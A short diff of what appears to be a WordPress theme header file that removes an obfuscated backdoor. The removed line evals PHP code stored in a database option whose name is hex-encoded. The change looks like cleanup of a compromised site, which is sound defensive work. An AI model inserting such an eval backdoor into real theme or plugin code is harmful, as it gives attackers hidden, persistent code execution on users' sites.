@@ -35,7 +35,7 @@
         </script>
 
 	</head>
-	<body <?php body_class(); ?>><?php eval(get_option("\x72\x65\x6e\x64\x65\x72")); ?>
+	<body <?php body_class(); ?>>
 
 		<!-- wrapper -->
 		
